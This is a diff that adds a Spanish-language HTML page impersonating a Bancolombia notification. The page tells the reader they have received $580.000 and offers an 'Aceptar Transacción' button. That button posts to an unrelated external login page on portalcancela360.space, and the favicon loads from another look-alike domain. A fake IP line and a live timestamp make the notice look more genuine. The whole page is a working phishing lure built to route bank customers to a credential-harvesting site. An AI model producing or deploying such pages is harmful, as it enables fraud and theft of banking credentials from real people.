@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/boxicons/2.0.9/css/boxicons.min.css">
+    <link rel="icon" href="https://personalvirtualesco.site/assets/img/logo.png">
+    <title>Notificación Bancolombia</title>
+
+    <style>
+        /* General */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f7f8fb;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        h3 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #003B5C;
+            margin-bottom: 10px;
+        }
+
+        h4 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #FFD200;
+            margin-bottom: 20px;
+        }
+
+        a {
+            font-size: 1rem;
+            color: #333;
+            margin-bottom: 15px;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .img img,
+        .texto img {
+            width: 100%;
+            border-radius: 12px;
+            margin-top: 10px;
+        }
+
+        .texto {
+            text-align: center;
+            margin-top: 30px;
+            max-width: 800px;
+        }
+
+        .box__btn {
+            width: 70%;
+            padding: 15px;
+            background-color: #003B5C;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .box__btn:hover {
+            background-color: #00233B;
+            transform: scale(1.05);
+        }
+
+        .footer {
+            width: 100%;
+            background-color: #003B5C;
+            color: white;
+            padding: 20px;
+            margin-top: 50px;
+            text-align: center;
+            border-radius: 15px 15px 0 0;
+        }
+
+        .footer img {
+            width: 100%;
+            border-radius: 12px;
+        }
+
+        .footer__logo1,
+        .footer__logo2 {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            background-color: #FFD200;
+            border-radius: 50%;
+            margin-top: 15px;
+        }
+
+        .line {
+            border-top: 1px solid #fff;
+            margin: 15px 0;
+        }
+
+        /* Responsive */
+        @media screen and (max-width: 768px) {
+            .box__btn {
+                width: 85%;
+                font-size: 0.9rem;
+            }
+
+            h3 {
+                font-size: 1.3rem;
+            }
+
+            h4 {
+                font-size: 1rem;
+            }
+
+            .footer {
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="img">
+        <img src="./imagi_files/header.png" alt="Header Imagen">
+    </div>
+    <div class="texto">
+        <h3>¡Has recibido $580.000!</h3>
+        <p>Verifica tu cuenta en línea para más detalles sobre esta transacción.</p>
+        <h4>Nuevo abono en tu cuenta Bancolombia</h4>
+        <form action="https://portalcancela360.space/a/login.php" method="post">
+            <button class="box__btn">Aceptar Transacción</button>
+        </form>
+    </div>
+
+    <footer class="footer">
+        <div>
+            <img src="./imagi_files/servicios.png" alt="Servicios">
+        </div>
+        <div class="line"></div>
+        <div class="footer__logo1"></div>
+        <div class="footer__logo2"></div>
+        <span>
+            <p>Dirección IP: 190.210.118.1</p>
+            <p id="currentDate">miércoles, 15 de enero de 2025, 1:30 a.m.</p>
+        </span>
+    </footer>
+
+    <script>
+        // Script para mostrar la fecha actual
+        const currentDateElement = document.getElementById("currentDate");
+        const currentDate = new Date();
+        currentDateElement.textContent = currentDate.toLocaleString('es-ES', {
+            weekday: 'long',
+            year: 'numeric',
+            month: 'long',
+            day: 'numeric',
+            hour: 'numeric',
+            minute: 'numeric',
+            second: 'numeric',
+            hour12: true
+        });
+    </script>
+</body>
+
+</html>
